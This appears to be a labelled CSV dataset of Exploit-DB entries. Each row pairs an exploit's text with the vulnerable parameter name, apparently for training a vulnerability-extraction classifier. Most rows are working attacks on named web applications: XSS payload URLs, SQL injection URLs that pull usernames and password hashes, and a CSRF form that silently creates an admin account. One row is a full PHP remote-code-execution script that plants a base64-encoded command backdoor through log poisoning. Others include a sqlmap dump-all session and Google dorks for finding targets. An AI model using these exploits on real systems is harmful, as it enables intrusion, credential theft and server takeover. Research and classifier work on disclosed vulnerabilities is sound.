37828,Poweradmin - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/55619/info  Poweradmin is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/index.php/%3E%22%3E%3CScRiPt%3Ealert%28415833140173%29%3C/ScRiPt%3E,"[""'index.php'""]",1
48328,"Xeroneit Library Management System 3.0 - 'category' SQL Injection # Exploit Title: Xeroneit Library Management System 3.0 - 'category' SQL Injection # Google Dork: ""LMS v3.0 - Xerone IT "" # Date: 2020-04-09 # Exploit Author: Sohel Yousef jellyfish security team # Software Link: https://xeroneit.net/portfolio/library-management-system-lms # Software Demo :https://xeroneit.co/demo/lms/home/login # Version: v3.0 # Category: webapps  1. Description scritp has SQLI in books category at this dir  /lms/home/book?category_name=00*SQLI  Error Number: 1064  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0' GROUP BY `title`, `author`, `edition` ORDER BY `title` ASC LIMIT 21' at line 3  SELECT sum(cast(cast(book_info.status as char) as SIGNED)) as available_book, `book_info`.`number_of_books`, `book_info`.`id`, `book_info`.`category_id`, `book_info`.`title`, `book_info`.`size1` as `size`, `book_info`.`publishing_year`, `book_info`.`publisher`, `book_info`.`edition_year`, `book_info`.`subtitle`, `book_info`.`edition`, `book_info`.`isbn`, `book_info`.`author`, `book_info`.`cover`, `book_info`.`add_date` FROM `book_info` WHERE FIND_IN_SET('57'', category_id) !=0 AND `book_info`.`deleted` = '0' GROUP BY `title`, `author`, `edition` ORDER BY `title` ASC LIMIT 21  Filename: models/Basic.php  Line Number: 284","[""'category'""]",1
17251,"VCalendar 1.1.5 - Cross-Site Request Forgery Vulnerability ID: HTB22969 Reference: http://www.htbridge.ch/advisory/csrf_cross_site_request_forgery_in_vcalendar.html Product: VCalendar Vendor: UltraApps ( http://ultraapps.com )  Vulnerable Version: 1.1.5 Vendor Notification: 21 April 2011  Vulnerability Type: CSRF (Cross-Site Request Forgery) Risk level: Low  Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ )   Vulnerability Details: The vulnerability exists due to failure in the ""/admin/users_maint.php"" script to properly verify the source of HTTP request. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data. Attacker can use browser to exploit this vulnerability. The following PoC is available:   <form action=""http://[host]/admin/users_maint.php?ccsForm=users_maint"" method=""post"" name=""main"" /> <input type=""hidden"" name=""user_login"" value=""test""/> <input type=""hidden"" name=""user_password"" value=""test""/> <input type=""hidden"" name=""user_level"" value=""100""/> <input type=""hidden"" name=""user_email"" value=""test@test.com""/> <input type=""hidden"" name=""user_first_name"" value=""test""/> <input type=""hidden"" name=""user_last_name"" value=""test""/> <input type=""hidden"" name=""user_is_approved"" value=""1""/> <input type=""hidden"" name=""user_date_add_h"" value=""04.16.2011""/> <input type=""submit"" id=""btn"" name=""submit"" value=""Submit â€ºâ€º""> </form> <script> document.getElementById('btn').click(); </script>","['maint.php""']",1
6453,"FoT Video scripti 1.1b - 'oyun' SQL Injection **************************************************************************************  Author : By Crackers_Child Contact: cashr00t@hotmail.com Greetz : biyosecurity.com & milw0rm.com & tryag.cc & All My Friends  ************************************************************************************** Script   : FoT Video scripti V1.1 Beta  **************************************************************************************  Exploit : For username  you can read username on title  www.site.com/script_path/izle.asp?oyun=56+union+select+0,1,KULLANICIADI,3,4,5,6,7,8,9,10,11,12,13+from+KULLANICI  **************************************************************************************  Exploit : For Password(md5 hash)  you can read password on title  www.site.com/script_path/izle.asp?oyun=56+union+select+0,1,PAROLA,3,4,5,6,7,8,9,10,11,12,13+from+KULLANICI  **************************************************************************************  Administrator Path  www.site.com/script_path/yonetim_default.asp  **************************************************************************************   Dork : inurl:""izle.asp?oyun=  **************************************************************************************  N0te : Hepinizn Aq :lol **************************************************************************************  # milw0rm.com [2008-09-13]","[""'oyun'""]",1
29364,"PHP iCalendar 1.1/2.x - 'month.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21792/info   PHP icalendar is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/phpicalendar/month.php?cal=all_calendars_combined971 &getdate=20061225""><script>alert()</script>","[""'month.php'""]",1
26180,"Land Down Under 800/801 - 'forums.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/14618/info     Land Down Under is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.     Successful exploitation may allow the attacker to compromise the application, retrieve sensitive information, modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/ldu/forums.php?filter=forums%2Ephp%3Fc%3Dskin&x=' http://www.example.com/ldu/forums.php?m=topics&q=3&n='  http://www.example.com/ldu/forums.php?m='&q=3&n=last  http://www.example.com/ldu/forums.php?m=topics&s='","[""'forums.php'""]",1
29228,"Vt-Forum Lite 1.3 - 'vf_newtopic.asp' IFRAME Element Cross-Site Scripting source: https://www.securityfocus.com/bid/21428/info   Vt-Forum Lite is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   The attacker may also be able to conduct HTML-injection attacks through unspecified fields on the 'vf_newtopic.asp' script page.   These issues affect version 1.3; other versions may also be vulnerable.  http://www.example.com/[scriptpath]/vf_newtopic.asp<iframe height=500 src=""http://www.example2.com/yoursite.html"">","[""'vf_newtopic.asp'"", 'IFRAME Element']",1
2573,"Comdev One Admin 4.1 - 'Adminfoot.php' Remote Code Execution #!/usr/bin/php <?php  /*********************************************************************  * Comdev One Admin 4.1 Remote Command Execution / File Inclusion Vulnerability  *   * Note:  * Requires register globals to be on, and magic quotes gpc to be off.  *  * Usage:   * php script.php [host] [path] [command]  *  * Usage Example:  * php script.php domain.com /oneadminpro/ whoami  *  * Credit:  * Synsta - Vulnerability discovery and exploit scripting  *  * File Inclusion:  * <host>/<path>/oneadmin/adminfoot.php?path[docroot]=<local/remote file>  *  * Googledork: inurl:/oneadmin/  *  * [w4ck1ng] - w4ck1ng.com  *  *********************************************************************/   if(!$argv[3 ]){ die(""Usage: php $argv[0] [host] [path] [command]\n Usage Example: php $argv[0] domain.com /dolphin/ whoami\n""); }  function send($host, $put){ global $data; $conn = fsockopen( gethostbyname($host),""80"" ); if(!$conn) { die(""Connection to $host failed...""); }else{ fputs($conn, $put); } while(!feof($conn)) { $data .=fgets( $conn); } fclose($conn); return $data; }  $host = $argv[ 1]; $path = $argv[ 2]; $cmd = $argv[ 3];  if($argv[3]){  $shellcode = base64_decode( ""PD9waHAgaWYoJF9TRVJWRVJbSFRUUF9DTURdKXsgZWNobyBjbWR4cGxzdGFydC5zaGVsbF9leGVjKHN0cmlwc2xhc2hlcygkX1NFUlZFUltIVFRQX0NNRF0pKS5jbWR4cGxlbmQ7IH0gPz4=""); $req = ""GET "". $path.""/oneadmin/adminfoot.php?path[docroot]=$shellcode HTTP/1.1\r\n""; $req .=""Accept-Encoding: text/plain\r\n"" ; $req .=""Host: "". $host.""\r\n""; $req .=""Connection: Close\r\n\r\n"" ; send(""$host"", ""$req"");  $logs = array(""../../../../../var/log/httpd/access_log"" , ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../logs/access_log"", ""../../../logs/error_log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../../../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"");  $i = 0;  foreach($logs as $value){  $logs[$i++];  $req = ""GET "". $path.""/oneadmin/adminfoot.php?path[docroot]=$logs[$i]%00 HTTP/1.1\r\n""; $req .=""CMD: $cmd\r\n""; $req .=""Accept-Encoding: text/plain\r\n"" ; $req .=""Host: "". $host.""\r\n""; $req .=""Connection: Close\r\n\r\n"" ; send(""$host"", ""$req""); print(""Trying $logs[$i]..\n"");  $adata = explode( ""cmdxplstart"",$data); $bdata = explode( ""cmdxplend"",$adata[1 ]); $cdata = $bdata[ 0];  if(eregi(""cmdxplend"",  $data)){  if($cdata==NULL){  die(""\nExploit succeeded but blank command received..\n"");  } die(""\nExploit Succeeded!\n\nCommand Resolution:\n$cdata\n"");  } } }  die(""Exploit Failed!\n""); ?>  # milw0rm.com [2006-10-16]","[""'Adminfoot.php'""]",1
47310,"SQLiteManager 1.2.0 / 1.2.4 - Blind SQL Injection <!-- # Exploit Title: Blind SQL injection in SQLiteManager 1.2.0 (and 1.2.4) # Date: 17-02-2019 # Exploit Author: Rafael Pedrero # Vendor Homepage: http://www.sqlitemanager.org/ # Software Link: http://www.sqlitemanager.org/ # Version: SQLiteManager 1.2.0 (and 1.2.4) # Tested on: All # CVE : CVE-2019-9083 # Category: webapps   1. Description  SQLiteManager 1.20 allows SQL injection via the /sqlitemanager/main.php dbsel parameter. NOTE: This product is discontinued.   2. Proof of Concept  Detect: http://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2072 http://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2070  Save the next post in a file: sqli.txt  POST /sqlite/main.php?dbsel=-1%20or%2032%20%3d%2030 HTTP/1.1 Content-Length: 191 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Cookie: PHPSESSID=s5uogfet0s4nhr81ihgmg5l4v3; SQLiteManager_currentTheme=default; SQLiteManager_currentLangue=8; SQLiteManager_fullText=0; SQLiteManager_HTMLon=0 Host: localhost Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)  action=save&ColumnList=1&ConditionList=1&trigger=&TriggerAction=FOR%20EACH%20ROW&TriggerCondition=WHEN&TriggerEvent=DELETE&TriggerMoment=BEFORE&TriggerName=kqluvanc&TriggerOn=t1&TriggerStep=1  $ python sqlmap.py -r sqli.txt -p dbsel --level 5 --risk 3 --dump-all  [11:58:27] [INFO] resuming back-end DBMS 'sqlite' [11:58:27] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: dbsel (GET)     Type: boolean-based blind     Title: OR boolean-based blind - WHERE or HAVING clause     Payload: dbsel=-4019 OR 7689=7689 --- [11:58:27] [INFO] the back-end DBMS is SQLite web server operating system: Windows web application technology: PHP X.X.X, Apache 2.X.X back-end DBMS: SQLite [11:58:27] [INFO] sqlmap will dump entries of all tables from all databases now [11:58:27] [INFO] fetching tables for database: 'SQLite_masterdb' [11:58:27] [INFO] fetching number of tables for database 'SQLite_masterdb' [11:58:27] [WARNING] reflective value(s) found and filtering out [11:58:27] [WARNING] running in a single-thread mode. Please consider usage of o ption '--threads' for faster data retrieval [11:58:27] [INFO] retrieved: 5 [11:58:27] [INFO] retrieved: database [11:58:28] [INFO] retrieved: user_function [11:58:30] [INFO] retrieved: attachment [11:58:31] [INFO] retrieved: groupes [11:58:32] [INFO] retrieved: users ..... ..... .....   3. Solution:  The product is discontinued. Update to last version. -->",['main.php '],1
18822,"PHP-decoda - 'Video Tag' Cross-Site Scripting Advisory: php-decoda: Cross-Site Scripting in Video Tags  RedTeam Pentesting discovered a cross-site scripting (XSS) vulnerability in the PHP markup parser Decoda. This allows attackers that should be restricted to the markup supported by Decoda to specify a JavaScript event handler for an iframe tag. Depending on the usage of Decoda, this allows attackers to execute JavaScript code in the context of other users in a web application that uses Decoda.   Details =======  Product: php-decoda Affected Versions: 3.x Fixed Versions: 3.3.3 Vulnerability Type: Cross-Site Scripting Security Risk: High Vendor URL: http://milesj.me/code/php/decoda Vendor Status: fixed version released Advisory URL: http://www.redteam-pentesting.de/advisories/rt-sa-2012-002 Advisory Status: published CVE: GENERIC-MAP-NOMATCH CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH   Introduction ============  Decoda is a lightweight class that extracts and parses a custom markup language; based on the concept of BB code. Decoda supports all the basic HTML tags and manages special features for making links and emails auto-clickable, using shorthand emails and links, and finally allowing the user to add their own code tags.  (from Decoda's homepage)   More Details ============  Decoda supports a directive for videos. For example the Decoda markup  [video=""youtube"" size=""small""]test[/video]  creates the following corresponding HTML code (whitespace adjusted):  <iframe src=""http://www.youtube.com/embed/test""; width=""560"" height=""315"" frameborder=""0""></iframe>  The code to generate the iframe tag can be found in the following file:  decoda/templates/video.php  There, the HTML tag is generated as follows:  <?php if ($player == 'embed') { ?>         <embed src=""<?php echo $url; ?>""                 type=""application/x-shockwave-flash""                 allowscriptaccess=""always""                 allowfullscreen=""true""                 width=""<?php echo $width; ?>""                 height=""<?php echo $height; ?>""></embed>  <?php } else { ?>         <iframe src=""<?php echo $url; ?>""                 width=""<?php echo $width; ?>""                 height=""<?php echo $height; ?>""                 frameborder=""0""></iframe>  <?php } ?>  The variable $url contains the user input provided in the video markup prefixed by the URL to YouTube. Since quotation signs provided by a user are not properly encoded, an attacker can use this to specify a JavaScript event handler that is executed when the resulting HTML document is loaded.   Proof of Concept ================  The following PHP script can be used to demonstrate this vulnerability:  <?php include '../decoda/Decoda.php'; $code = new Decoda(); $code->addFilter(new VideoFilter()); ?> <?php  $decoda_markup = '[video=""youtube"" size=""small""]""'; $decoda_markup .= 'onload=""alert(\'RedTeam Pentesting XSS\');"" id=""[/video]';  $code->reset($decoda_markup); echo $code->parse(); ?>  This results in the following output (whitespace adjusted):  <iframe src=""http://www.youtube.com/embed/""; onload=""alert('RedTeam Pentesting XSS');"" id="""" width=""560"" height=""315"" frameborder=""0""></iframe>    Workaround ==========  Disabling support for the video markup by not adding the corresponding filter might close this attack vector depending on the usage of Decoda.  Fix ===  Update to at least version 3.3.3.   Security Risk =============  The risk of the described vulnerability is considered to be high. It might be lower depending on the use case of Decoda in a web application. In case it is used in an web forum to allow formatting of postings, it can be used by attackers to completely manipulate the web page showing the respective posting by adding arbitrary content, tracking user interaction and potentially obtaining credentials from other users.   History =======  2012-03-26 Vulnerability identified 2012-04-25 Customer approved disclosure to vendor 2012-04-26 First attempt to contact vendor 2012-04-30 Vendor notified 2012-05-01 Vendor released fixed version 2012-05-02 Advisory released","[""'Video Tag'""]",1
